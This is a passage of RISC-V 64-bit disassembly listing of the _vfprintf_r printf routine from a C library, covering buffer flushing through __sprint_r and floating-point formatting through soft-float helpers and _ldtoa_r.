   11c2c:	97e2                	add	a5,a5,s8
   11c2e:	01233023          	sd	s2,0(t1)
   11c32:	01833423          	sd	s8,8(t1)
   11c36:	f23e                	sd	a5,288(sp)
   11c38:	10d12c23          	sw	a3,280(sp)
   11c3c:	471d                	li	a4,7
   11c3e:	0341                	addi	t1,t1,16
   11c40:	aad758e3          	bge	a4,a3,116f0 <_vfprintf_r+0xe22>
   11c44:	0a10                	addi	a2,sp,272
   11c46:	85d2                	mv	a1,s4
   11c48:	8556                	mv	a0,s5
   11c4a:	242070ef          	jal	ra,18e8c <__sprint_r>
   11c4e:	820510e3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   11c52:	7792                	ld	a5,288(sp)
   11c54:	835e                	mv	t1,s7
   11c56:	bc69                	j	116f0 <_vfprintf_r+0xe22>
   11c58:	7702                	ld	a4,32(sp)
   11c5a:	4c1d                	li	s8,7
   11c5c:	9766                	add	a4,a4,s9
   11c5e:	f83a                	sd	a4,48(sp)
   11c60:	7706                	ld	a4,96(sp)
   11c62:	cb49                	beqz	a4,11cf4 <_vfprintf_r+0x1426>
   11c64:	6746                	ld	a4,80(sp)
   11c66:	eb51                	bnez	a4,11cfa <_vfprintf_r+0x142c>
   11c68:	7726                	ld	a4,104(sp)
   11c6a:	177d                	addi	a4,a4,-1
   11c6c:	f4ba                	sd	a4,104(sp)
   11c6e:	7706                	ld	a4,96(sp)
   11c70:	377d                	addiw	a4,a4,-1
   11c72:	f0ba                	sd	a4,96(sp)
   11c74:	674a                	ld	a4,144(sp)
   11c76:	66aa                	ld	a3,136(sp)
   11c78:	0341                	addi	t1,t1,16
   11c7a:	fee33823          	sd	a4,-16(t1)
   11c7e:	11812703          	lw	a4,280(sp)
   11c82:	97b6                	add	a5,a5,a3
   11c84:	fed33c23          	sd	a3,-8(t1)
   11c88:	2705                	addiw	a4,a4,1
   11c8a:	f23e                	sd	a5,288(sp)
   11c8c:	0007069b          	sext.w	a3,a4
   11c90:	10e12c23          	sw	a4,280(sp)
   11c94:	0cdc4e63          	blt	s8,a3,11d70 <_vfprintf_r+0x14a2>
   11c98:	7726                	ld	a4,104(sp)
   11c9a:	00074603          	lbu	a2,0(a4)
   11c9e:	7742                	ld	a4,48(sp)
   11ca0:	41b705bb          	subw	a1,a4,s11
   11ca4:	0006071b          	sext.w	a4,a2
   11ca8:	0007069b          	sext.w	a3,a4
   11cac:	00e5d463          	bge	a1,a4,11cb4 <_vfprintf_r+0x13e6>
   11cb0:	0005869b          	sext.w	a3,a1
   11cb4:	02d05663          	blez	a3,11ce0 <_vfprintf_r+0x1412>
   11cb8:	11812703          	lw	a4,280(sp)
   11cbc:	97b6                	add	a5,a5,a3
   11cbe:	01b33023          	sd	s11,0(t1)
   11cc2:	0017061b          	addiw	a2,a4,1
   11cc6:	00d33423          	sd	a3,8(t1)
   11cca:	f23e                	sd	a5,288(sp)
   11ccc:	10c12c23          	sw	a2,280(sp)
   11cd0:	0acc4a63          	blt	s8,a2,11d84 <_vfprintf_r+0x14b6>
   11cd4:	7726                	ld	a4,104(sp)
   11cd6:	0341                	addi	t1,t1,16
   11cd8:	00074603          	lbu	a2,0(a4)
   11cdc:	0006071b          	sext.w	a4,a2
   11ce0:	fff6c593          	not	a1,a3
   11ce4:	95fd                	srai	a1,a1,0x3f
   11ce6:	8eed                	and	a3,a3,a1
   11ce8:	9f15                	subw	a4,a4,a3
   11cea:	00e04c63          	bgtz	a4,11d02 <_vfprintf_r+0x1434>
   11cee:	9db2                	add	s11,s11,a2
   11cf0:	7706                	ld	a4,96(sp)
   11cf2:	fb2d                	bnez	a4,11c64 <_vfprintf_r+0x1396>
   11cf4:	6746                	ld	a4,80(sp)
   11cf6:	30070463          	beqz	a4,11ffe <_vfprintf_r+0x1730>
   11cfa:	6746                	ld	a4,80(sp)
   11cfc:	377d                	addiw	a4,a4,-1
   11cfe:	e8ba                	sd	a4,80(sp)
   11d00:	bf95                	j	11c74 <_vfprintf_r+0x13a6>
   11d02:	11812683          	lw	a3,280(sp)
   11d06:	00ed4663          	blt	s10,a4,11d12 <_vfprintf_r+0x1444>
   11d0a:	a081                	j	11d4a <_vfprintf_r+0x147c>
   11d0c:	3741                	addiw	a4,a4,-16
   11d0e:	02ed5e63          	bge	s10,a4,11d4a <_vfprintf_r+0x147c>
   11d12:	2685                	addiw	a3,a3,1
   11d14:	07c1                	addi	a5,a5,16
   11d16:	01233023          	sd	s2,0(t1)
   11d1a:	01a33423          	sd	s10,8(t1)
   11d1e:	f23e                	sd	a5,288(sp)
   11d20:	10d12c23          	sw	a3,280(sp)
   11d24:	0341                	addi	t1,t1,16
   11d26:	fedc53e3          	bge	s8,a3,11d0c <_vfprintf_r+0x143e>
   11d2a:	0a10                	addi	a2,sp,272
   11d2c:	85d2                	mv	a1,s4
   11d2e:	8556                	mv	a0,s5
   11d30:	e43a                	sd	a4,8(sp)
   11d32:	15a070ef          	jal	ra,18e8c <__sprint_r>
   11d36:	f2051c63          	bnez	a0,1146e <_vfprintf_r+0xba0>
   11d3a:	6722                	ld	a4,8(sp)
   11d3c:	7792                	ld	a5,288(sp)
   11d3e:	11812683          	lw	a3,280(sp)
   11d42:	3741                	addiw	a4,a4,-16
   11d44:	835e                	mv	t1,s7
   11d46:	fced46e3          	blt	s10,a4,11d12 <_vfprintf_r+0x1444>
   11d4a:	2685                	addiw	a3,a3,1
   11d4c:	97ba                	add	a5,a5,a4
   11d4e:	00e33423          	sd	a4,8(t1)
   11d52:	01233023          	sd	s2,0(t1)
   11d56:	f23e                	sd	a5,288(sp)
   11d58:	0006871b          	sext.w	a4,a3
   11d5c:	10d12c23          	sw	a3,280(sp)
   11d60:	32ec4463          	blt	s8,a4,12088 <_vfprintf_r+0x17ba>
   11d64:	7726                	ld	a4,104(sp)
   11d66:	0341                	addi	t1,t1,16
   11d68:	00074603          	lbu	a2,0(a4)
   11d6c:	9db2                	add	s11,s11,a2
   11d6e:	b749                	j	11cf0 <_vfprintf_r+0x1422>
   11d70:	0a10                	addi	a2,sp,272
   11d72:	85d2                	mv	a1,s4
   11d74:	8556                	mv	a0,s5
   11d76:	116070ef          	jal	ra,18e8c <__sprint_r>
   11d7a:	ee051a63          	bnez	a0,1146e <_vfprintf_r+0xba0>
   11d7e:	7792                	ld	a5,288(sp)
   11d80:	835e                	mv	t1,s7
   11d82:	bf19                	j	11c98 <_vfprintf_r+0x13ca>
   11d84:	0a10                	addi	a2,sp,272
   11d86:	85d2                	mv	a1,s4
   11d88:	8556                	mv	a0,s5
   11d8a:	e436                	sd	a3,8(sp)
   11d8c:	100070ef          	jal	ra,18e8c <__sprint_r>
   11d90:	ec051f63          	bnez	a0,1146e <_vfprintf_r+0xba0>
   11d94:	77a6                	ld	a5,104(sp)
   11d96:	66a2                	ld	a3,8(sp)
   11d98:	835e                	mv	t1,s7
   11d9a:	0007c603          	lbu	a2,0(a5)
   11d9e:	7792                	ld	a5,288(sp)
   11da0:	0006071b          	sext.w	a4,a2
   11da4:	bf35                	j	11ce0 <_vfprintf_r+0x1412>
   11da6:	2605                	addiw	a2,a2,1
   11da8:	01070313          	addi	t1,a4,16
   11dac:	8c3a                	mv	s8,a4
   11dae:	f76ff06f          	j	11524 <_vfprintf_r+0xc56>
   11db2:	0a10                	addi	a2,sp,272
   11db4:	85d2                	mv	a1,s4
   11db6:	8556                	mv	a0,s5
   11db8:	0d4070ef          	jal	ra,18e8c <__sprint_r>
   11dbc:	ea051963          	bnez	a0,1146e <_vfprintf_r+0xba0>
   11dc0:	562e                	lw	a2,232(sp)
   11dc2:	7792                	ld	a5,288(sp)
   11dc4:	835e                	mv	t1,s7
   11dc6:	b329                	j	11ad0 <_vfprintf_r+0x1202>
   11dc8:	0000bc97          	auipc	s9,0xb
   11dcc:	880c8c93          	addi	s9,s9,-1920 # 1c648 <__clzdi2+0x16e>
   11dd0:	bb79                	j	11b6e <_vfprintf_r+0x12a0>
   11dd2:	0a10                	addi	a2,sp,272
   11dd4:	85d2                	mv	a1,s4
   11dd6:	8556                	mv	a0,s5
   11dd8:	0b4070ef          	jal	ra,18e8c <__sprint_r>
   11ddc:	e8051963          	bnez	a0,1146e <_vfprintf_r+0xba0>
   11de0:	7792                	ld	a5,288(sp)
   11de2:	835e                	mv	t1,s7
   11de4:	b8e5                	j	116dc <_vfprintf_r+0xe0e>
   11de6:	4c19                	li	s8,6
   11de8:	b135                	j	11a14 <_vfprintf_r+0x1146>
   11dea:	7682                	ld	a3,32(sp)
   11dec:	00dc8833          	add	a6,s9,a3
   11df0:	40e6873b          	subw	a4,a3,a4
   11df4:	41b80ebb          	subw	t4,a6,s11
   11df8:	0007069b          	sext.w	a3,a4
   11dfc:	00ded363          	bge	t4,a3,11e02 <_vfprintf_r+0x1534>
   11e00:	8776                	mv	a4,t4
   11e02:	00070c9b          	sext.w	s9,a4
   11e06:	b2bd                	j	11774 <_vfprintf_r+0xea6>
   11e08:	6782                	ld	a5,0(sp)
   11e0a:	8ca2                	mv	s9,s0
   11e0c:	00f71023          	sh	a5,0(a4)
   11e10:	d51fe06f          	j	10b60 <_vfprintf_r+0x292>
   11e14:	1982                	slli	s3,s3,0x20
   11e16:	0209d993          	srli	s3,s3,0x20
   11e1a:	e55fe06f          	j	10c6e <_vfprintf_r+0x3a0>
   11e1e:	67c2                	ld	a5,16(sp)
   11e20:	0007a983          	lw	s3,0(a5)
   11e24:	87ce                	mv	a5,s3
   11e26:	debfe06f          	j	10c10 <_vfprintf_r+0x342>
   11e2a:	1982                	slli	s3,s3,0x20
   11e2c:	0209d993          	srli	s3,s3,0x20
   11e30:	e83a                	sd	a4,16(sp)
   11e32:	4785                	li	a5,1
   11e34:	e47fe06f          	j	10c7a <_vfprintf_r+0x3ac>
   11e38:	1982                	slli	s3,s3,0x20
   11e3a:	0209d993          	srli	s3,s3,0x20
   11e3e:	b685                	j	1199e <_vfprintf_r+0x10d0>
   11e40:	02d00793          	li	a5,45
   11e44:	0cf10fa3          	sb	a5,223(sp)
   11e48:	b3d9                	j	11c0e <_vfprintf_r+0x1340>
   11e4a:	0a10                	addi	a2,sp,272
   11e4c:	85d2                	mv	a1,s4
   11e4e:	8556                	mv	a0,s5
   11e50:	03c070ef          	jal	ra,18e8c <__sprint_r>
   11e54:	d1dfe06f          	j	10b70 <_vfprintf_r+0x2a2>
   11e58:	03000793          	li	a5,48
   11e5c:	0ef10023          	sb	a5,224(sp)
   11e60:	05800713          	li	a4,88
   11e64:	0024e793          	ori	a5,s1,2
   11e68:	2781                	sext.w	a5,a5
   11e6a:	0ee100a3          	sb	a4,225(sp)
   11e6e:	ed3e                	sd	a5,152(sp)
   11e70:	06300713          	li	a4,99
   11e74:	ec02                	sd	zero,24(sp)
   11e76:	12810c93          	addi	s9,sp,296
   11e7a:	47d74563          	blt	a4,t4,122e4 <_vfprintf_r+0x1a16>
   11e7e:	69b2                	ld	s3,264(sp)
   11e80:	fdfdf713          	andi	a4,s11,-33
   11e84:	1024e493          	ori	s1,s1,258
   11e88:	f0ba                	sd	a4,96(sp)
   11e8a:	e582                	sd	zero,200(sp)
   11e8c:	6c12                	ld	s8,256(sp)
   11e8e:	2481                	sext.w	s1,s1
   11e90:	1e09c463          	bltz	s3,12078 <_vfprintf_r+0x17aa>
   11e94:	06100793          	li	a5,97
   11e98:	52fd8c63          	beq	s11,a5,123d0 <_vfprintf_r+0x1b02>
   11e9c:	04100793          	li	a5,65
   11ea0:	00fd8463          	beq	s11,a5,11ea8 <_vfprintf_r+0x15da>
   11ea4:	eb7fe06f          	j	10d5a <_vfprintf_r+0x48c>
   11ea8:	85ce                	mv	a1,s3
   11eaa:	8562                	mv	a0,s8
   11eac:	fc1a                	sd	t1,56(sp)
   11eae:	f876                	sd	t4,48(sp)
   11eb0:	3f80a0ef          	jal	ra,1c2a8 <__trunctfdf2>
   11eb4:	11a8                	addi	a0,sp,232
   11eb6:	765040ef          	jal	ra,16e1a <frexp>
   11eba:	32e0a0ef          	jal	ra,1c1e8 <__extenddftf2>
   11ebe:	0000b797          	auipc	a5,0xb
   11ec2:	99278793          	addi	a5,a5,-1646 # 1c850 <zeroes.4521+0x30>
   11ec6:	6390                	ld	a2,0(a5)
   11ec8:	6794                	ld	a3,8(a5)
   11eca:	41e090ef          	jal	ra,1b2e8 <__multf3>
   11ece:	4601                	li	a2,0
   11ed0:	4681                	li	a3,0
   11ed2:	f02a                	sd	a0,32(sp)
   11ed4:	e42e                	sd	a1,8(sp)
   11ed6:	22e090ef          	jal	ra,1b104 <__eqtf2>
   11eda:	62a2                	ld	t0,8(sp)
   11edc:	7702                	ld	a4,32(sp)
   11ede:	7ec2                	ld	t4,48(sp)
   11ee0:	7362                	ld	t1,56(sp)
   11ee2:	e119                	bnez	a0,11ee8 <_vfprintf_r+0x161a>
   11ee4:	4785                	li	a5,1
   11ee6:	d5be                	sw	a5,232(sp)
   11ee8:	0000a797          	auipc	a5,0xa
   11eec:	77878793          	addi	a5,a5,1912 # 1c660 <__clzdi2+0x186>
   11ef0:	e8be                	sd	a5,80(sp)
   11ef2:	020e9793          	slli	a5,t4,0x20
   11ef6:	0000b697          	auipc	a3,0xb
   11efa:	93a68693          	addi	a3,a3,-1734 # 1c830 <zeroes.4521+0x10>
   11efe:	9381                	srli	a5,a5,0x20
   11f00:	6290                	ld	a2,0(a3)
   11f02:	0785                	addi	a5,a5,1
   11f04:	6694                	ld	a3,8(a3)
   11f06:	97e6                	add	a5,a5,s9
   11f08:	f13e                	sd	a5,160(sp)
   11f0a:	01dc87bb          	addw	a5,s9,t4
   11f0e:	fd32                	sd	a2,184(sp)
   11f10:	e1b6                	sd	a3,192(sp)
   11f12:	8c66                	mv	s8,s9
   11f14:	db3e                	sw	a5,180(sp)
   11f16:	a831                	j	11f32 <_vfprintf_r+0x1664>
   11f18:	4601                	li	a2,0
   11f1a:	4681                	li	a3,0
   11f1c:	e4ae                	sd	a1,72(sp)
   11f1e:	e0aa                	sd	a0,64(sp)
   11f20:	1e4090ef          	jal	ra,1b104 <__eqtf2>
   11f24:	7ec2                	ld	t4,48(sp)
   11f26:	7362                	ld	t1,56(sp)
   11f28:	6f86                	ld	t6,64(sp)
   11f2a:	68a6                	ld	a7,72(sp)
   11f2c:	62a2                	ld	t0,8(sp)
   11f2e:	7702                	ld	a4,32(sp)
   11f30:	c135                	beqz	a0,11f94 <_vfprintf_r+0x16c6>
   11f32:	766a                	ld	a2,184(sp)
   11f34:	668e                	ld	a3,192(sp)
   11f36:	853a                	mv	a0,a4
   11f38:	8596                	mv	a1,t0
   11f3a:	fc1a                	sd	t1,56(sp)
   11f3c:	f876                	sd	t4,48(sp)
   11f3e:	3aa090ef          	jal	ra,1b2e8 <__multf3>
   11f42:	e42e                	sd	a1,8(sp)
   11f44:	f02a                	sd	a0,32(sp)
   11f46:	1b00a0ef          	jal	ra,1c0f6 <__fixtfsi>
   11f4a:	0005099b          	sext.w	s3,a0
   11f4e:	854e                	mv	a0,s3
   11f50:	23c0a0ef          	jal	ra,1c18c <__floatsitf>
   11f54:	7882                	ld	a7,32(sp)
   11f56:	6722                	ld	a4,8(sp)
   11f58:	862a                	mv	a2,a0
   11f5a:	86ae                	mv	a3,a1
   11f5c:	8546                	mv	a0,a7
   11f5e:	85ba                	mv	a1,a4
   11f60:	19b090ef          	jal	ra,1b8fa <__subtf3>
   11f64:	67c6                	ld	a5,80(sp)
   11f66:	f562                	sd	s8,168(sp)
   11f68:	0c05                	addi	s8,s8,1
   11f6a:	01378733          	add	a4,a5,s3
   11f6e:	57da                	lw	a5,180(sp)
   11f70:	00074703          	lbu	a4,0(a4)
   11f74:	f02a                	sd	a0,32(sp)
   11f76:	418787bb          	subw	a5,a5,s8
   11f7a:	ecbe                	sd	a5,88(sp)
   11f7c:	778a                	ld	a5,160(sp)
   11f7e:	feec0fa3          	sb	a4,-1(s8)
   11f82:	e42e                	sd	a1,8(sp)
   11f84:	7ec2                	ld	t4,48(sp)
   11f86:	7362                	ld	t1,56(sp)
   11f88:	8faa                	mv	t6,a0
   11f8a:	88ae                	mv	a7,a1
   11f8c:	f98796e3          	bne	a5,s8,11f18 <_vfprintf_r+0x164a>
   11f90:	57fd                	li	a5,-1
   11f92:	ecbe                	sd	a5,88(sp)
   11f94:	0000b717          	auipc	a4,0xb
   11f98:	8ac70713          	addi	a4,a4,-1876 # 1c840 <zeroes.4521+0x20>
   11f9c:	6310                	ld	a2,0(a4)
   11f9e:	6714                	ld	a3,8(a4)
   11fa0:	857e                	mv	a0,t6
   11fa2:	85c6                	mv	a1,a7
   11fa4:	f01a                	sd	t1,32(sp)
   11fa6:	e476                	sd	t4,8(sp)
   11fa8:	e4fe                	sd	t6,72(sp)
   11faa:	e0b2                	sd	a2,64(sp)
   11fac:	fc36                	sd	a3,56(sp)
   11fae:	f846                	sd	a7,48(sp)
   11fb0:	1e8090ef          	jal	ra,1b198 <__getf2>
   11fb4:	6ea2                	ld	t4,8(sp)
   11fb6:	7302                	ld	t1,32(sp)
   11fb8:	2ca04f63          	bgtz	a0,12296 <_vfprintf_r+0x19c8>
   11fbc:	6fa6                	ld	t6,72(sp)
   11fbe:	78c2                	ld	a7,48(sp)
   11fc0:	6606                	ld	a2,64(sp)
   11fc2:	76e2                	ld	a3,56(sp)
   11fc4:	857e                	mv	a0,t6
   11fc6:	85c6                	mv	a1,a7
   11fc8:	13c090ef          	jal	ra,1b104 <__eqtf2>
   11fcc:	6ea2                	ld	t4,8(sp)
   11fce:	7302                	ld	t1,32(sp)
   11fd0:	e509                	bnez	a0,11fda <_vfprintf_r+0x170c>
   11fd2:	0019f993          	andi	s3,s3,1
   11fd6:	2c099063          	bnez	s3,12296 <_vfprintf_r+0x19c8>
   11fda:	67e6                	ld	a5,88(sp)
   11fdc:	03000693          	li	a3,48
   11fe0:	00178713          	addi	a4,a5,1
   11fe4:	9762                	add	a4,a4,s8
   11fe6:	0007c763          	bltz	a5,11ff4 <_vfprintf_r+0x1726>
   11fea:	0c05                	addi	s8,s8,1
   11fec:	fedc0fa3          	sb	a3,-1(s8)
   11ff0:	ff871de3          	bne	a4,s8,11fea <_vfprintf_r+0x171c>
   11ff4:	419c07bb          	subw	a5,s8,s9
   11ff8:	f03e                	sd	a5,32(sp)
   11ffa:	de5fe06f          	j	10dde <_vfprintf_r+0x510>
   11ffe:	7702                	ld	a4,32(sp)
   12000:	9766                	add	a4,a4,s9
   12002:	efb77e63          	bgeu	a4,s11,116fe <_vfprintf_r+0xe30>
   12006:	8dba                	mv	s11,a4
   12008:	ef6ff06f          	j	116fe <_vfprintf_r+0xe30>
   1200c:	6766                	ld	a4,88(sp)
   1200e:	57f5                	li	a5,-3
   12010:	00f74463          	blt	a4,a5,12018 <_vfprintf_r+0x174a>
   12014:	00eed863          	bge	t4,a4,12024 <_vfprintf_r+0x1756>
   12018:	3df9                	addiw	s11,s11,-2
   1201a:	fdfdf793          	andi	a5,s11,-33
   1201e:	f0be                	sd	a5,96(sp)
   12020:	ddffe06f          	j	10dfe <_vfprintf_r+0x530>
   12024:	7782                	ld	a5,32(sp)
   12026:	6766                	ld	a4,88(sp)
   12028:	16f74563          	blt	a4,a5,12192 <_vfprintf_r+0x18c4>
   1202c:	67ea                	ld	a5,152(sp)
   1202e:	8c3a                	mv	s8,a4
   12030:	8b85                	andi	a5,a5,1
   12032:	c781                	beqz	a5,1203a <_vfprintf_r+0x176c>
   12034:	77c6                	ld	a5,112(sp)
   12036:	00e78c3b          	addw	s8,a5,a4
   1203a:	67ea                	ld	a5,152(sp)
   1203c:	4007f793          	andi	a5,a5,1024
   12040:	c781                	beqz	a5,12048 <_vfprintf_r+0x177a>
   12042:	67e6                	ld	a5,88(sp)
   12044:	30f04763          	bgtz	a5,12352 <_vfprintf_r+0x1a84>
   12048:	fffc4993          	not	s3,s8
   1204c:	43f9d993          	srai	s3,s3,0x3f
   12050:	013c79b3          	and	s3,s8,s3
   12054:	2981                	sext.w	s3,s3
   12056:	06700d93          	li	s11,103
   1205a:	e882                	sd	zero,80(sp)
   1205c:	f082                	sd	zero,96(sp)
   1205e:	e83fe06f          	j	10ee0 <_vfprintf_r+0x612>
   12062:	0df14783          	lbu	a5,223(sp)
   12066:	4e81                	li	t4,0
   12068:	c399                	beqz	a5,1206e <_vfprintf_r+0x17a0>
   1206a:	be9fe06f          	j	10c52 <_vfprintf_r+0x384>
   1206e:	a11fe06f          	j	10a7e <_vfprintf_r+0x1b0>
   12072:	ed26                	sd	s1,152(sp)
   12074:	ec02                	sd	zero,24(sp)
   12076:	84fe                	mv	s1,t6
   12078:	57fd                	li	a5,-1
   1207a:	17fe                	slli	a5,a5,0x3f
   1207c:	00f9c9b3          	xor	s3,s3,a5
   12080:	02d00793          	li	a5,45
   12084:	e5be                	sd	a5,200(sp)
   12086:	b539                	j	11e94 <_vfprintf_r+0x15c6>
   12088:	0a10                	addi	a2,sp,272
   1208a:	85d2                	mv	a1,s4
   1208c:	8556                	mv	a0,s5
   1208e:	5ff060ef          	jal	ra,18e8c <__sprint_r>
   12092:	bc051e63          	bnez	a0,1146e <_vfprintf_r+0xba0>
   12096:	77a6                	ld	a5,104(sp)
   12098:	835e                	mv	t1,s7
   1209a:	0007c603          	lbu	a2,0(a5)
   1209e:	7792                	ld	a5,288(sp)
   120a0:	9db2                	add	s11,s11,a2
   120a2:	b1b9                	j	11cf0 <_vfprintf_r+0x1422>
   120a4:	02d00793          	li	a5,45
   120a8:	0cf10fa3          	sb	a5,223(sp)
   120ac:	bc4d                	j	11b5e <_vfprintf_r+0x1290>
   120ae:	8776                	mv	a4,t4
   120b0:	11bc                	addi	a5,sp,232
   120b2:	0f810893          	addi	a7,sp,248
   120b6:	0ec10813          	addi	a6,sp,236
   120ba:	4689                	li	a3,2
   120bc:	85e2                	mv	a1,s8
   120be:	864e                	mv	a2,s3
   120c0:	8556                	mv	a0,s5
   120c2:	f01a                	sd	t1,32(sp)
   120c4:	e476                	sd	t4,8(sp)
   120c6:	458020ef          	jal	ra,1451e <_ldtoa_r>
   120ca:	7706                	ld	a4,96(sp)
   120cc:	04700793          	li	a5,71
   120d0:	6ea2                	ld	t4,8(sp)
   120d2:	7302                	ld	t1,32(sp)
   120d4:	8caa                	mv	s9,a0
   120d6:	02f71d63          	bne	a4,a5,12110 <_vfprintf_r+0x1842>
   120da:	67ea                	ld	a5,152(sp)
   120dc:	8b85                	andi	a5,a5,1
   120de:	18079b63          	bnez	a5,12274 <_vfprintf_r+0x19a6>
   120e2:	04700713          	li	a4,71
   120e6:	77ee                	ld	a5,248(sp)
   120e8:	f0ba                	sd	a4,96(sp)
   120ea:	ceffe06f          	j	10dd8 <_vfprintf_r+0x50a>
   120ee:	8776                	mv	a4,t4
   120f0:	0f810893          	addi	a7,sp,248
   120f4:	0ec10813          	addi	a6,sp,236
   120f8:	11bc                	addi	a5,sp,232
   120fa:	468d                	li	a3,3
   120fc:	85e2                	mv	a1,s8
   120fe:	864e                	mv	a2,s3
   12100:	8556                	mv	a0,s5
   12102:	f01a                	sd	t1,32(sp)
   12104:	e476                	sd	t4,8(sp)
   12106:	418020ef          	jal	ra,1451e <_ldtoa_r>
   1210a:	6ea2                	ld	t4,8(sp)
   1210c:	7302                	ld	t1,32(sp)
   1210e:	8caa                	mv	s9,a0
   12110:	7706                	ld	a4,96(sp)
   12112:	04600793          	li	a5,70
   12116:	01dc88b3          	add	a7,s9,t4
   1211a:	00f70463          	beq	a4,a5,12122 <_vfprintf_r+0x1854>
   1211e:	c85fe06f          	j	10da2 <_vfprintf_r+0x4d4>
   12122:	000cc703          	lbu	a4,0(s9)
   12126:	03000793          	li	a5,48
   1212a:	00f70663          	beq	a4,a5,12136 <_vfprintf_r+0x1868>
   1212e:	572e                	lw	a4,232(sp)
   12130:	98ba                	add	a7,a7,a4
   12132:	c71fe06f          	j	10da2 <_vfprintf_r+0x4d4>
   12136:	4601                	li	a2,0
   12138:	4681                	li	a3,0
   1213a:	8562                	mv	a0,s8
   1213c:	85ce                	mv	a1,s3
   1213e:	f846                	sd	a7,48(sp)
   12140:	f01a                	sd	t1,32(sp)
   12142:	e476                	sd	t4,8(sp)
   12144:	7c1080ef          	jal	ra,1b104 <__eqtf2>
   12148:	6ea2                	ld	t4,8(sp)
   1214a:	7302                	ld	t1,32(sp)
   1214c:	78c2                	ld	a7,48(sp)
   1214e:	d165                	beqz	a0,1212e <_vfprintf_r+0x1860>
   12150:	4785                	li	a5,1
   12152:	41d7873b          	subw	a4,a5,t4
   12156:	d5ba                	sw	a4,232(sp)
   12158:	98ba                	add	a7,a7,a4
   1215a:	c49fe06f          	j	10da2 <_vfprintf_r+0x4d4>
   1215e:	0a10                	addi	a2,sp,272
   12160:	85d2                	mv	a1,s4
   12162:	8556                	mv	a0,s5
   12164:	529060ef          	jal	ra,18e8c <__sprint_r>
   12168:	b0051363          	bnez	a0,1146e <_vfprintf_r+0xba0>
   1216c:	572e                	lw	a4,232(sp)
   1216e:	7792                	ld	a5,288(sp)
   12170:	835e                	mv	t1,s7
   12172:	dc2ff06f          	j	11734 <_vfprintf_r+0xe66>
   12176:	0df14783          	lbu	a5,223(sp)
   1217a:	e836                	sd	a3,16(sp)
   1217c:	e882                	sd	zero,80(sp)
   1217e:	f082                	sd	zero,96(sp)
   12180:	ec82                	sd	zero,88(sp)
   12182:	89f6                	mv	s3,t4
   12184:	8c76                	mv	s8,t4
   12186:	4e81                	li	t4,0
   12188:	c399                	beqz	a5,1218e <_vfprintf_r+0x18c0>
   1218a:	ac9fe06f          	j	10c52 <_vfprintf_r+0x384>
   1218e:	8f1fe06f          	j	10a7e <_vfprintf_r+0x1b0>
   12192:	7702                	ld	a4,32(sp)
   12194:	77c6                	ld	a5,112(sp)
   12196:	06700d93          	li	s11,103
   1219a:	00e78c3b          	addw	s8,a5,a4
   1219e:	6766                	ld	a4,88(sp)
   121a0:	2ce05263          	blez	a4,12464 <_vfprintf_r+0x1b96>
   121a4:	67ea                	ld	a5,152(sp)
   121a6:	4007f793          	andi	a5,a5,1024
   121aa:	1a079663          	bnez	a5,12356 <_vfprintf_r+0x1a88>
   121ae:	fffc4993          	not	s3,s8
   121b2:	43f9d993          	srai	s3,s3,0x3f
   121b6:	013c79b3          	and	s3,s8,s3
   121ba:	2981                	sext.w	s3,s3
   121bc:	bd79                	j	1205a <_vfprintf_r+0x178c>
   121be:	67ea                	ld	a5,152(sp)
   121c0:	6766                	ld	a4,88(sp)
   121c2:	8b85                	andi	a5,a5,1
   121c4:	00fee7b3          	or	a5,t4,a5
   121c8:	2ae05c63          	blez	a4,12480 <_vfprintf_r+0x1bb2>
   121cc:	26079d63          	bnez	a5,12446 <_vfprintf_r+0x1b78>
   121d0:	6c66                	ld	s8,88(sp)
   121d2:	06600d93          	li	s11,102
   121d6:	b7f9                	j	121a4 <_vfprintf_r+0x18d6>
   121d8:	0a10                	addi	a2,sp,272
   121da:	85d2                	mv	a1,s4
   121dc:	8556                	mv	a0,s5
   121de:	4af060ef          	jal	ra,18e8c <__sprint_r>
   121e2:	a8051663          	bnez	a0,1146e <_vfprintf_r+0xba0>
   121e6:	56ae                	lw	a3,232(sp)
   121e8:	7702                	ld	a4,32(sp)
   121ea:	7792                	ld	a5,288(sp)
   121ec:	835e                	mv	t1,s7
   121ee:	40d706bb          	subw	a3,a4,a3
   121f2:	d82ff06f          	j	11774 <_vfprintf_r+0xea6>
   121f6:	57fd                	li	a5,-1
   121f8:	e03e                	sd	a5,0(sp)
   121fa:	985fe06f          	j	10b7e <_vfprintf_r+0x2b0>
   121fe:	56c1                	li	a3,-16
   12200:	40c00c3b          	negw	s8,a2
   12204:	02d65f63          	bge	a2,a3,12242 <_vfprintf_r+0x1974>
   12208:	4d9d                	li	s11,7
   1220a:	a021                	j	12212 <_vfprintf_r+0x1944>
   1220c:	3c41                	addiw	s8,s8,-16
   1220e:	038d5a63          	bge	s10,s8,12242 <_vfprintf_r+0x1974>
   12212:	2705                	addiw	a4,a4,1
   12214:	07c1                	addi	a5,a5,16
   12216:	01233023          	sd	s2,0(t1)
   1221a:	01a33423          	sd	s10,8(t1)
   1221e:	f23e                	sd	a5,288(sp)
   12220:	10e12c23          	sw	a4,280(sp)
   12224:	0341                	addi	t1,t1,16
   12226:	feedd3e3          	bge	s11,a4,1220c <_vfprintf_r+0x193e>
   1222a:	0a10                	addi	a2,sp,272
   1222c:	85d2                	mv	a1,s4
   1222e:	8556                	mv	a0,s5
   12230:	45d060ef          	jal	ra,18e8c <__sprint_r>
   12234:	a2051d63          	bnez	a0,1146e <_vfprintf_r+0xba0>
   12238:	7792                	ld	a5,288(sp)
   1223a:	11812703          	lw	a4,280(sp)
   1223e:	835e                	mv	t1,s7
   12240:	b7f1                	j	1220c <_vfprintf_r+0x193e>
   12242:	2705                	addiw	a4,a4,1
   12244:	97e2                	add	a5,a5,s8
   12246:	01233023          	sd	s2,0(t1)
   1224a:	01833423          	sd	s8,8(t1)
   1224e:	f23e                	sd	a5,288(sp)
   12250:	10e12c23          	sw	a4,280(sp)
   12254:	469d                	li	a3,7
   12256:	8ae6d8e3          	bge	a3,a4,11b06 <_vfprintf_r+0x1238>
   1225a:	0a10                	addi	a2,sp,272
   1225c:	85d2                	mv	a1,s4
   1225e:	8556                	mv	a0,s5
   12260:	42d060ef          	jal	ra,18e8c <__sprint_r>
   12264:	a0051563          	bnez	a0,1146e <_vfprintf_r+0xba0>
   12268:	7792                	ld	a5,288(sp)
   1226a:	11812703          	lw	a4,280(sp)
   1226e:	835e                	mv	t1,s7
   12270:	cedfe06f          	j	10f5c <_vfprintf_r+0x68e>
   12274:	04700793          	li	a5,71
   12278:	01dc88b3          	add	a7,s9,t4
